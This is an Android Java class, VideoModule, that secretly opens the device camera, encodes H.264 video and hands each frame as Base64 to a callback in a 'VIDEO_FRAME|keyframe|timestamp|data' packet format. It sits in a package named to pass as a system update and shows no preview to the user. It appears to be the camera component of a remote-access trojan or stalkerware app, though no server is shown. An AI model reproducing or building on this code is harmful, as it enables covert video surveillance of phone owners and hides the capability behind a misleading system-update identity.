package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;

public class VideoModule {
    private static final String TAG = "VideoModule";
    private Context context;
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isFrontCamera = false;
    
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    
    // MediaCodec for H.264 encoding
    private MediaCodec mediaCodec;
    private Surface encoderSurface;
    
    private AtomicBoolean isStreaming = new AtomicBoolean(false);
    private int frameCount = 0;
    private long startTime = 0;
    
    public interface VideoCallback {
        void onVideoFrame(String base64Frame);
        void onStreamStarted();
        void onStreamStopped();
        void onError(String error);
    }
    
    public VideoModule(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
    }
    
    public void startStreaming(final VideoCallback callback, boolean useFrontCamera) {
        Log.d(TAG, "startStreaming() called");
        
        if (!checkPermission()) {
            callback.onError("ERROR: No camera permission");
            return;
        }
        
        if (isStreaming.getAndSet(true)) {
            callback.onError("ERROR: Already streaming");
            return;
        }
        
        isFrontCamera = useFrontCamera;
        
        // Select camera
        try {
            selectCamera(useFrontCamera);
            if (cameraId == null) {
                callback.onError("ERROR: No camera available");
                return;
            }
        } catch (Exception e) {
            callback.onError("ERROR: " + e.getMessage());
            return;
        }
        
        // Start camera thread
        cameraThread = new HandlerThread("VideoStreamingThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        
        cameraHandler.post(() -> {
            try {
                // Initialize MediaCodec for H.264 encoding
                initMediaCodec();
                
                // Set up camera with encoder surface
                setupCameraWithEncoder(callback);
                
                startTime = System.currentTimeMillis();
                callback.onStreamStarted();
                
            } catch (Exception e) {
                Log.e(TAG, "Error starting stream", e);
                callback.onError("ERROR: " + e.getMessage());
            }
        });
    }
    
    private void initMediaCodec() throws Exception {
        // Configure MediaCodec for H.264 encoding
        MediaFormat format = MediaFormat.createVideoFormat(
            MediaFormat.MIMETYPE_VIDEO_AVC, 640, 480);
        format.setInteger(MediaFormat.KEY_COLOR_FORMAT,
            MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        format.setInteger(MediaFormat.KEY_BIT_RATE, 500000); // 500 kbps
        format.setInteger(MediaFormat.KEY_FRAME_RATE, 15);
        format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2); // Keyframe every 2 seconds
        
        mediaCodec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
        mediaCodec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
        encoderSurface = mediaCodec.createInputSurface();
        mediaCodec.start();
        
        Log.d(TAG, "MediaCodec initialized");
    }
    
    private void setupCameraWithEncoder(VideoCallback callback) throws Exception {
        CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
        StreamConfigurationMap map = characteristics.get(
            CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        
        // Choose a good size for streaming (640x480 works well)
        Size[] sizes = map.getOutputSizes(Surface.class);
        Size selectedSize = null;
        for (Size size : sizes) {
            if (size.getWidth() == 640 && size.getHeight() == 480) {
                selectedSize = size;
                break;
            }
        }
        if (selectedSize == null) {
            selectedSize = sizes[0]; // Fallback
        }
        
        Log.d(TAG, "Using size: " + selectedSize.getWidth() + "x" + selectedSize.getHeight());
        
        cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
            @Override
            public void onOpened(@androidx.annotation.NonNull CameraDevice camera) {
                cameraDevice = camera;
                
                try {
                    // Create capture request for preview
                    CaptureRequest.Builder builder = camera.createCaptureRequest(
                        CameraDevice.TEMPLATE_PREVIEW);
                    builder.addTarget(encoderSurface);
                    
                    camera.createCaptureSession(
                        Arrays.asList(encoderSurface),
                        new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(
                                    @androidx.annotation.NonNull CameraCaptureSession session) {
                                try {
                                    session.setRepeatingRequest(builder.build(), 
                                        new CameraCaptureSession.CaptureCallback() {
                                            @Override
                                            public void onCaptureCompleted(
                                                    @androidx.annotation.NonNull CameraCaptureSession session,
                                                    @androidx.annotation.NonNull CaptureRequest request,
                                                    @androidx.annotation.NonNull TotalCaptureResult result) {
                                                frameCount++;
                                                
                                                // Process encoded frames from MediaCodec
                                                processEncodedFrames(callback);
                                            }
                                        }, cameraHandler);
                                } catch (Exception e) {
                                    callback.onError("ERROR: " + e.getMessage());
                                }
                            }
                            
                            @Override
                            public void onConfigureFailed(
                                    @androidx.annotation.NonNull CameraCaptureSession session) {
                                callback.onError("ERROR: Session configure failed");
                            }
                        }, cameraHandler
                    );
                } catch (Exception e) {
                    callback.onError("ERROR: " + e.getMessage());
                }
            }
            
            @Override
            public void onDisconnected(@androidx.annotation.NonNull CameraDevice camera) {
                stopStreaming(callback);
            }
            
            @Override
            public void onError(@androidx.annotation.NonNull CameraDevice camera, int error) {
                callback.onError("ERROR: Camera error " + error);
                stopStreaming(callback);
            }
        }, cameraHandler);
    }
    
    private void processEncodedFrames(VideoCallback callback) {
        MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo();
        
        while (isStreaming.get()) {
            int outputBufferId = mediaCodec.dequeueOutputBuffer(bufferInfo, 10000);
            
            if (outputBufferId >= 0) {
                ByteBuffer outputBuffer = mediaCodec.getOutputBuffer(outputBufferId);
                
                if (outputBuffer != null && bufferInfo.size > 0) {
                    byte[] frameData = new byte[bufferInfo.size];
                    outputBuffer.get(frameData);
                    
                    // Check if this is a keyframe or regular frame
                    boolean isKeyFrame = (bufferInfo.flags & MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0;
                    
                    // Send frame data
                    String base64Frame = Base64.encodeToString(frameData, Base64.NO_WRAP);
                    
                    // Format: VIDEO_FRAME|isKeyFrame|timestamp|base64data
                    String framePacket = String.format("VIDEO_FRAME|%d|%d|%s",
                        isKeyFrame ? 1 : 0,
                        System.currentTimeMillis(),
                        base64Frame);
                    
                    callback.onVideoFrame(framePacket);
                }
                
                mediaCodec.releaseOutputBuffer(outputBufferId, false);
            }
        }
    }
    
    public void stopStreaming(VideoCallback callback) {
        Log.d(TAG, "stopStreaming() called");
        isStreaming.set(false);
        
        // Clean up MediaCodec
        if (mediaCodec != null) {
            try {
                mediaCodec.stop();
                mediaCodec.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing MediaCodec", e);
            }
            mediaCodec = null;
        }
        
        // Close camera
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        // Clean up thread
        if (cameraThread != null) {
            cameraThread.quitSafely();
            try {
                cameraThread.join();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            cameraThread = null;
            cameraHandler = null;
        }
        
        callback.onStreamStopped();
        Log.d(TAG, "Stream stopped, frames sent: " + frameCount);
    }
    
    private void selectCamera(boolean useFront) throws CameraAccessException {
        for (String id : cameraManager.getCameraIdList()) {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            if (facing != null) {
                if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    cameraId = id;
                    return;
                } else if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    return;
                }
            }
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }
}
